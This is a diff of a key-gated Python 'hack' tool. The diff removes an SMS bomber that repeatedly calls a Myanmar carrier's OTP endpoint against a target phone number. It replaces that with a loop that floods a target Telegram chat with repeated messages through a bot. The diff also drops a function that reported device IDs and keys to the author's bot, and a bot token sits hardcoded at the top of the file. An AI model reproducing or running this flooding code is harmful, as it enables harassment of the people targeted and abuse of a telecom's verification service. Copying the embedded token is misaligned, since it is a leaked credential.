@@ -3,7 +3,6 @@ import requests, time, sys, hashlib, os, platform, subprocess, json
 
 BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
 KEY_FILE = os.path.join(os.path.expanduser("~"), ".hack_vip_key.json")
-# Online Key နေရာကို ထည့်သွင်းထားသည်
 ONLINE_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
 
 def get_model():
@@ -35,25 +34,6 @@ def banner():
     print(f"[*] Model     : {model}")
     print("="*50 + "\033[0m")
     return d_id, model
-
-def send_tg(d_id, model):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-        resp = requests.get(url).json()
-        if resp.get("result"):
-            chat_id = resp["result"][-1]["message"]["chat"]["id"]
-            msg = (f"🚨 New VIP Request 🚨\n"
-                   f"Model: {model}\n"
-                   f"ID: {d_id}\n\n"
-                   f"Keys:\n"
-                   f"1D: HACK-{d_id}-D1\n"
-                   f"3D: HACK-{d_id}-D3\n"
-                   f"5D: HACK-{d_id}-D5\n"
-                   f"7D: HACK-{d_id}-D7\n"
-                   f"15D: HACK-{d_id}-D15\n"
-                   f"30D: HACK-{d_id}-D30")
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": msg})
-    except: pass
 
 def check_online_keys(d_id):
     try:
@@ -91,16 +71,12 @@ def is_key_valid(key_data, d_id):
     return False
 
 def auth(d_id):
-    # Online စစ်ဆေးခြင်း
     online_valid, key = check_online_keys(d_id)
     if online_valid:
         save_key(key)
         return True
-        
-    # Local စစ်ဆေးခြင်း
     saved = get_saved_key()
     if is_key_valid(saved, d_id): return True
-        
     while True:
         key = input("\n[?] Enter VIP Key: ").strip()
         if key.startswith("HACK-") and d_id in key:
@@ -110,15 +86,15 @@ def auth(d_id):
             return True
         print("\033[1;31m[!] Invalid Key!\033[0m")
 
-def send_otp(p, c):
-    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
-    print(f"\n[*] Sending {c} OTP to {p}...")
-    for i in range(c):
+def send_love_msg(chat_id, count):
+    print(f"\n[*] Sending {count} messages to {chat_id}...")
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    for i in range(count):
         try:
-            requests.get(url.format(p))
-            print(f"[{i+1}/{c}] Done")
-        except: pass
-        time.sleep(0.05)
+            requests.post(url, data={"chat_id": chat_id, "text": "ချစ်တယ်ကွာ❤ အာဘွား😘"})
+            print(f"[{i+1}/{count}] Sent")
+        except: print(f"[{i+1}/{count}] Failed")
+        time.sleep(0.5)
     input("\nPress Enter to return...")
 
 def show_key_info(d_id):
@@ -136,11 +112,11 @@ def show_key_info(d_id):
 def main_menu(d_id, model):
     while True:
         banner()
-        print(" [1] SMS Tool\n [2] View VIP Key\n [0] Exit")
+        print(" [1] Send Love Message\n [2] View VIP Key\n [0] Exit")
         choice = input("\n[?] Option: ").strip()
         if choice == '1':
-            p = input("\n[?] Target Phone: ")
-            try: send_otp(p, int(input("[?] Count: ")))
+            chat_id = input("\n[?] Target Chat ID: ")
+            try: send_love_msg(chat_id, int(input("[?] Count: ")))
             except: pass
         elif choice == '2': show_key_info(d_id)
         elif choice == '0': sys.exit()
